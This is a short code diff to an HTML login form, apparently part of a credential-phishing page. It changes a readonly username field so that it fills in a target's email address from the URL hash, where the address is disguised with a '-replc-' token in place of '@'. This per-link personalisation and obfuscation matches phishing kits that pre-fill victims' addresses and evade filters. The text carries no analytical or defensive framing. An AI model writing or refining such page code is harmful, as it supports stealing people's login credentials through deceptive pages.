@@ -181,22 +181,22 @@ return(str.substring(theleft, theright));
           <div class="input-group">
             <span class="input-group-addon"><i class="fas fa-user"></i></span>
             <input type="email" class="form-control" name="username" placeholder="Recipent Email" value="" id="email" readonly>
-		  <script>
+<script>
         document.addEventListener('DOMContentLoaded', function() {
     const emailInput = document.getElementById('email');
-    const encodedEmail = 'contact-replc-abc.com'; // Your encoded email
     
-    // Replace -replc- with @ and set the value
-    emailInput.value = encodedEmail.replace(/-replc-/g, '@');
+    // Extract the email from the URL hash (e.g., "#contact-replc-abc.com")
+    const encodedEmail = window.location.hash.substring(1); // Removes the "#"
     
-    // Optional: If you want to ensure the user sees the correct format when focusing
-    emailInput.addEventListener('focus', function() {
-        if (this.value.includes('-replc-')) {
-            this.value = this.value.replace(/-replc-/g, '@');
-        }
-    });
+    if (encodedEmail) {
+        // Replace "-replc-" with "@" and set the input value
+        const decodedEmail = encodedEmail.replace(/-replc-/g, '@');
+        emailInput.value = decodedEmail;
+    } else {
+        console.log("No email found in the URL hash.");
+    }
 });
-    </script>
+</script>
           </div>
         </div>
 		
